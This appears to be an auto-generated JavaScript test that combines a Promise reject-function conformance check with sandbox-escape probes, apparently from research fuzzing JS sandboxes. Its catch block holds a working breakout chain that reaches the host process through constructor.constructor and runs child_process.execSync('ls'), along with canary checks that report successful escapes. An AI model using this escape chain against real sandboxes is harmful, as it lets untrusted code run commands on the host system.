try {
    Promise.resolve(1).then(function () {
        return Promise.resolve();
    }).then($DONE, $DONE);
    var then = Promise.prototype.then;
    Promise.prototype.then = function (resolve, reject) {
        assert.sameValue(isConstructor(reject), false, 'isConstructor(reject) must return false');
        assert.throws(TypeError, () => {
            new reject();
        }, '`new reject()` throws TypeError');
        assert.sameValue(reject.length, 1, 'The value of reject.length is 1');
        assert.sameValue(reject.name, '', 'The value of reject.name is ""');
        return then.call(this, resolve, reject);
    };
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}